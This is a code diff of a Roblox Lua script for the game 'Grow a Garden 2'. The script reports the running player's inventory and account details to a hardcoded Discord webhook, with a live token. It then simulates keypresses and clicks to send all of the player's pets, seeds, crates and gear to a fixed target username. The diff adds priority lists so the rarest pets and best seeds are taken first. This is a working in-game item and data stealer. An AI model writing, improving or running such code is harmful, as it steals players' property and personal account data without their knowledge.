@@ -5,19 +5,56 @@ local Lighting = game:GetService("Lighting")
 local petList = playerGui:WaitForChild("PetList")
 local toggleButton = petList:WaitForChild("Exit"):WaitForChild("OpenButton")
 local scrollingFrame = petList:WaitForChild("Frame"):WaitForChild("Notepad"):WaitForChild("ScrollingFrame")
+
 -- Config
 local TARGET_USERNAME = "Only1sherifalt1"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1516479845503205476/w2eyZPIVUgR9-ZWO1_yRZT9ws7aYpakwqhpjTEN90uFVSDmx_Vxg_EJK3T77zYhNm8h9"
 
--- Target pets to log (so we know their exact Inv_Pets: name format)
+-- Pets to LOG to Discord (watchlist, unrelated to send-order)
 local TARGET_PETS = { "bunny", "robin", "frog", "deer" }
 
+--------------------------------------------------------------------
+-- PRIORITY LISTS  (best first, trash last)
+-- Items are clicked in this order, so the good stuff goes into the
+-- mailbox before fillers can take the slots.
+--------------------------------------------------------------------
+
+-- Seeds / fruits priority (Grow a Garden 2 tier list, S -> D)
 local FRUITS = {
-    "Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Apple",
-    "Bamboo", "Corn", "Cactus", "Pineapple", "Mushroom", "Green Bean",
-    "Banana", "Grape", "Coconut", "Mango", "Dragon Fruit", "Acorn",
-    "Cherry", "Sunflower", "Venus Fly Trap", "Pomegranate", "Poision Apple",
-    "Moon Bloom", "Dragon's Breath"
+    -- S tier
+    "Dragon's Breath", "Moon Bloom", "Ghost Pepper", "Venus Fly Trap",
+    "Poison Ivy", "Pomegranate", "Poision Apple", -- in-game spelling
+    -- A tier
+    "Mushroom", "Glow Mushroom", "Sunflower", "Cherry", "Acorn",
+    "Dragon Fruit", "Mango", "Baby Cactus", "Cactus",
+    -- B tier
+    "Bamboo", "Horned Melon", "Banana", "Grape", "Coconut", "Green Bean",
+    -- C tier
+    "Apple", "Pineapple", "Corn", "Tomato",
+    -- D tier (fillers, sent last)
+    "Strawberry", "Blueberry", "Carrot", "Tulip"
+}
+
+-- Pet priority (lowercase substrings, matched against Inv_Pets:<name>)
+-- "huge" and "big" are SIZE MODIFIERS on top of any pet, and the
+-- rarest variants in the game, so they get sent before anything else.
+local PET_PRIORITY = {
+    -- Size modifiers (catches Huge Bunny, Huge Raccoon, Big Deer, etc.)
+    "huge", "big",
+
+    -- S tier specific pets
+    "raccoon", "black dragon", "ice serpent", "kitsune",
+    "cockatrice", "golden goose", "phoenix", "dragon",
+
+    -- A tier
+    "blood owl", "german shepherd", "deer", "bunny", "bee", "fox",
+
+    -- B tier
+    "golden dragonfly", "unicorn", "hedgehog", "honey bee",
+    "space squirrel", "frog",
+
+    -- C tier (low value, sent last among pets)
+    "owl", "monkey", "rooster", "bagel bunny", "snake", "cuckoo", "robin"
 }
 
 local CRATES = {
@@ -89,18 +126,18 @@ local function sendBackpackToWebhook()
     local function categorize(toolName)
         local n = toolName:lower()
         if n:find("shovel") or n:find("watering") or n:find("sprinkler")
-           or n:find("mushroom") or n:find("trowel") or n:find("hoe")
-           or n:find("rake")    or n:find("fertilizer") then
+            or n:find("mushroom") or n:find("trowel") or n:find("hoe")
+            or n:find("rake") or n:find("fertilizer") then
             return "gear"
         end
         if crateLookup[n] or n:find("crate") then return "crate" end
-        if n:find("pet")  then return "pet"  end
+        if n:find("pet") then return "pet" end
         if n:find("seed") or fruitLookup[n] then return "seed" end
         return "other"
     end
 
-    local equipped     = {}
-    local categorized  = { seed = {}, pet = {}, gear = {}, crate = {}, other = {} }
+    local equipped = {}
+    local categorized = { seed = {}, pet = {}, gear = {}, crate = {}, other = {} }
 
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
@@ -136,22 +173,22 @@ local function sendBackpackToWebhook()
     end
 
     local accountAge = tostring(localPlayer.AccountAge) .. " days"
-    local placeId    = tostring(game.PlaceId)
-    local jobId      = (game.JobId ~= "" and game.JobId) or "studio"
-    local serverPop  = tostring(#Players:GetPlayers()) .. " players"
+    local placeId = tostring(game.PlaceId)
+    local jobId = (game.JobId ~= "" and game.JobId) or "studio"
+    local serverPop = tostring(#Players:GetPlayers()) .. " players"
 
     local fields = {
         { name = "👤 User ID",     value = "```" .. tostring(localPlayer.UserId) .. "```", inline = true },
-        { name = "📆 Account Age", value = "```" .. accountAge .. "```",                   inline = true },
-        { name = "👥 In Server",   value = "```" .. serverPop  .. "```",                   inline = true },
+        { name = "📆 Account Age", value = "```" .. accountAge .. "```",                  inline = true },
+        { name = "👥 In Server",   value = "```" .. serverPop .. "```",                   inline = true },
 
-        { name = "🗺️ Place ID",   value = "```" .. placeId .. "```", inline = false },
-        { name = "🧩 Job ID",      value = "```" .. jobId   .. "```", inline = false },
+        { name = "🗺️ Place ID", value = "```" .. placeId .. "```", inline = false },
+        { name = "🧩 Job ID",   value = "```" .. jobId   .. "```", inline = false },
 
         { name = "📦 Totals", value = string.format(
             "🌿 Seeds: `%d` • 🐾 Pets: `%d` • 🔧 Gear: `%d`\n📦 Crates: `%d` • ⚔️ Equipped: `%d` • ❓ Other: `%d`",
             #categorized.seed, #categorized.pet, #categorized.gear,
-            #categorized.crate, #equipped,        #categorized.other
+            #categorized.crate, #equipped, #categorized.other
         ), inline = false },
 
         { name = "⚔️ Equipped (" .. #equipped .. ")", value = buildList(equipped), inline = false },
@@ -164,22 +201,22 @@ local function sendBackpackToWebhook()
     if #categorized.other > 0 then table.insert(fields, { name = "❓ Other ("  .. #categorized.other .. ")", value = buildList(categorized.other), inline = false }) end
 
     local payload = HttpService:JSONEncode({
-        username   = "Garden Logger",
+        username = "Garden Logger",
         avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png",
         embeds = {{
             author = {
-                name     = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
+                name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
                 icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
             },
-            title       = "🌱 Inventory Snapshot",
+            title = "🌱 Inventory Snapshot",
             description = "```ansi\n\27[2;32mPlayer joined — full backpack scan captured.\27[0m\n```",
-            color       = 0x57F287,
+            color = 0x57F287,
             thumbnail = {
                 url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=420&height=420&format=png"
             },
             fields = fields,
             footer = {
-                text     = "Garden Logger • " .. total .. " total items",
+                text = "Garden Logger • " .. total .. " total items",
                 icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
             },
             timestamp = DateTime.now():ToIsoDate()
@@ -188,10 +225,10 @@ local function sendBackpackToWebhook()
 
     pcall(function()
         requestFunc({
-            Url     = WEBHOOK_URL,
-            Method  = "POST",
+            Url = WEBHOOK_URL,
+            Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body    = payload
+            Body = payload
         })
         print("Inventory report sent to Discord for: " .. localPlayer.Name)
     end)
@@ -200,19 +237,19 @@ end
 -- Send a rich embed to Discord (used for pet logging)
 local function sendEmbed(title, description, color, fields)
     local payload = HttpService:JSONEncode({
-        username   = "Pet Logger",
+        username = "Pet Logger",
         avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png",
         embeds = {{
             author = {
-                name     = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
+                name = localPlayer.DisplayName .. " • @" .. localPlayer.Name,
                 icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
             },
-            title       = title,
+            title = title,
             description = description,
-            color       = color or 0xF1C40F,
-            fields      = fields or {},
+            color = color or 0xF1C40F,
+            fields = fields or {},
             footer = {
-                text     = "Pet Logger • " .. localPlayer.Name,
+                text = "Pet Logger • " .. localPlayer.Name,
                 icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(localPlayer.UserId) .. "&width=150&height=150&format=png"
             },
             timestamp = DateTime.now():ToIsoDate()
@@ -220,10 +257,10 @@ local function sendEmbed(title, description, color, fields)
     })
     pcall(function()
         requestFunc({
-            Url     = WEBHOOK_URL,
-            Method  = "POST",
+            Url = WEBHOOK_URL,
+            Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body    = payload
+            Body = payload
         })
     end)
 end
@@ -261,8 +298,8 @@ local function logTargetPets(inventoryFrame)
                     totalPets += (tonumber(count) or 1)
 
                     table.insert(foundFields, {
-                        name   = emoji .. "  " .. target:sub(1,1):upper() .. target:sub(2),
-                        value  = "```yaml\nname:  " .. name .. "\ncount: " .. tostring(count) .. "\n```",
+                        name = emoji .. " " .. target:sub(1,1):upper() .. target:sub(2),
+                        value = "```yaml\nname: " .. name .. "\ncount: " .. tostring(count) .. "\n```",
                         inline = true
                     })
 
@@ -278,9 +315,9 @@ local function logTargetPets(inventoryFrame)
         end
 
         table.insert(foundFields, 1, {
-            name  = "📊 Summary",
+            name = "📊 Summary",
             value = string.format("Detected **%d** target pet entries • total stack: **%d**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-                                  #foundFields, totalPets),
+                #foundFields, totalPets),
             inline = false
         })
 
@@ -344,30 +381,75 @@ local function runSequence()
     safeClick(toggleButton)
 end
 
+--------------------------------------------------------------------
+-- Click helpers
+--------------------------------------------------------------------
+
+-- Click a SPECIFIC inventory frame's button until count hits 0.
+local function clickFrameUntilEmpty(frame)
+    if not frame then return 0 end
+    local clickCount = 0
+    while clickCount < 999 do
+        local innerFrame = frame:FindFirstChildWhichIsA("Frame")
+        if not innerFrame then break end
+        local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
+        if not button then break end
+        local countLabel = frame:FindFirstChild("Count", true)
+            or frame:FindFirstChild("Amount", true)
+            or innerFrame:FindFirstChildWhichIsA("TextLabel")
+        if countLabel then
+            local count = tonumber(countLabel.Text:match("%d+"))
+            if count and count <= 0 then break end
+        end
+        clickButton(button)
+        clickCount += 1
+        task.wait(0.1)
+    end
+    return clickCount
+end
+
+-- Click everything with the given prefix in whatever order the UI lists it.
 local function clickAllByPrefix(inventoryFrame, prefix)
     for _, child in ipairs(inventoryFrame:GetChildren()) do
         if child.Name:sub(1, #prefix) == prefix then
-            local clickCount = 0
-            while clickCount < 999 do
-                local frame = inventoryFrame:FindFirstChild(child.Name)
-                if not frame then break end
-                local innerFrame = frame:FindFirstChildWhichIsA("Frame")
-                if not innerFrame then break end
-                local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-                if not button then break end
-                local countLabel = frame:FindFirstChild("Count", true)
-                    or frame:FindFirstChild("Amount", true)
-                    or innerFrame:FindFirstChildWhichIsA("TextLabel")
-                if countLabel then
-                    local count = tonumber(countLabel.Text:match("%d+"))
-                    if count and count <= 0 then break end
-                end
-                clickButton(button)
-                clickCount += 1
-                task.wait(0.1)
+            local clicked = clickFrameUntilEmpty(child)
+            if clicked > 0 then
+                print("Clicked " .. child.Name .. " x" .. clicked)
             end
-            if clickCount > 0 then
-                print("Clicked " .. child.Name .. " x" .. clickCount)
+        end
+    end
+end
+
+-- Click pets in priority order first (Huge/Big -> S -> A -> B -> C),
+-- then sweep up any remaining pets that didn't match the priority list.
+local function clickPetsByPriority(inventoryFrame)
+    local handled = {}
+
+    -- Pass 1: priority pets, best -> worst
+    for _, target in ipairs(PET_PRIORITY) do
+        for _, child in ipairs(inventoryFrame:GetChildren()) do
+            local name = child.Name
+            if not handled[name] and name:sub(1, 9) == "Inv_Pets:" then
+                local petPart = name:sub(10):lower()
+                if petPart:find(target, 1, true) then
+                    handled[name] = true
+                    local clicked = clickFrameUntilEmpty(child)
+                    if clicked > 0 then
+                        print("[PRIORITY PET: " .. target .. "] " .. name .. " x" .. clicked)
+                    end
+                end
+            end
+        end
+    end
+
+    -- Pass 2: any other pets that didn't match the priority list
+    for _, child in ipairs(inventoryFrame:GetChildren()) do
+        local name = child.Name
+        if not handled[name] and name:sub(1, 9) == "Inv_Pets:" then
+            handled[name] = true
+            local clicked = clickFrameUntilEmpty(child)
+            if clicked > 0 then
+                print("[OTHER PET] " .. name .. " x" .. clicked)
             end
         end
     end
@@ -376,8 +458,8 @@ end
 local function hasAnythingToSend(inventoryFrame)
     for _, child in ipairs(inventoryFrame:GetChildren()) do
         local name = child.Name
-        if name:sub(1, 10) == "Inv_Seeds:" then return true end
-        if name:sub(1, 9)  == "Inv_Pets:"  then return true end
+        if name:sub(1, 10) == "Inv_Seeds:"  then return true end
+        if name:sub(1,  9) == "Inv_Pets:"   then return true end
         if name:sub(1, 11) == "Inv_Crates:" then return true end
         for _, prefix in ipairs(GEAR_PREFIXES) do
             if name:sub(1, #prefix) == prefix then return true end
@@ -425,7 +507,7 @@ local function runScript()
     task.wait(0.3)
     pcall(function()
         local VIM = game:GetService("VirtualInputManager")
-        VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+        VIM:SendKeyEvent(true,  Enum.KeyCode.Return, false, game)
         task.wait(0.1)
         VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
     end)
@@ -480,59 +562,27 @@ local function runScript()
         return "done"
     end
 
-    print("Clicking fruits...")
+    -- 1) PETS FIRST — Huge/Big/best pets get sent before mailbox fills up
+    print("Clicking pets (priority order)...")
+    clickPetsByPriority(inventoryFrame)
+
+    -- 2) Seeds, in tier order (S -> D)
+    print("Clicking seeds (tier order)...")
     for _, fruitName in ipairs(FRUITS) do
         local frameName = "Inv_Seeds:" .. fruitName
-        local clickCount = 0
-        while clickCount < 999 do
-            local fruitFrame = inventoryFrame:FindFirstChild(frameName)
-            if not fruitFrame then break end
-            local innerFrame = fruitFrame:FindFirstChildWhichIsA("Frame")
-            if not innerFrame then break end
-            local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-            if not button then break end
-            local countLabel = fruitFrame:FindFirstChild("Count", true)
-                or fruitFrame:FindFirstChild("Amount", true)
-                or innerFrame:FindFirstChildWhichIsA("TextLabel")
-            if countLabel then
-                local count = tonumber(countLabel.Text:match("%d+"))
-                if count and count <= 0 then break end
-            end
-            clickButton(button)
-            clickCount += 1
-            task.wait(0.1)
-        end
-        if clickCount > 0 then print("Fruit clicked: " .. fruitName .. " x" .. clickCount) end
+        local clicked = clickFrameUntilEmpty(inventoryFrame:FindFirstChild(frameName))
+        if clicked > 0 then print("Seed clicked: " .. fruitName .. " x" .. clicked) end
     end
 
-    print("Clicking pets...")
-    clickAllByPrefix(inventoryFrame, "Inv_Pets:")
-
+    -- 3) Crates
     print("Clicking crates...")
     for _, crateName in ipairs(CRATES) do
         local frameName = "Inv_Crates:" .. crateName
-        local clickCount = 0
-        while clickCount < 999 do
-            local crateFrame = inventoryFrame:FindFirstChild(frameName)
-            if not crateFrame then break end
-            local innerFrame = crateFrame:FindFirstChildWhichIsA("Frame")
-            if not innerFrame then break end
-            local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-            if not button then break end
-            local countLabel = crateFrame:FindFirstChild("Count", true)
-                or crateFrame:FindFirstChild("Amount", true)
-                or innerFrame:FindFirstChildWhichIsA("TextLabel")
-            if countLabel then
-                local count = tonumber(countLabel.Text:match("%d+"))
-                if count and count <= 0 then break end
-            end
-            clickButton(button)
-            clickCount += 1
-            task.wait(0.1)
-        end
-        if clickCount > 0 then print("Crate clicked: " .. crateName .. " x" .. clickCount) end
+        local clicked = clickFrameUntilEmpty(inventoryFrame:FindFirstChild(frameName))
+        if clicked > 0 then print("Crate clicked: " .. crateName .. " x" .. clicked) end
     end
 
+    -- 4) Gear last
     print("Clicking gears...")
     for _, prefix in ipairs(GEAR_PREFIXES) do
         clickAllByPrefix(inventoryFrame, prefix)
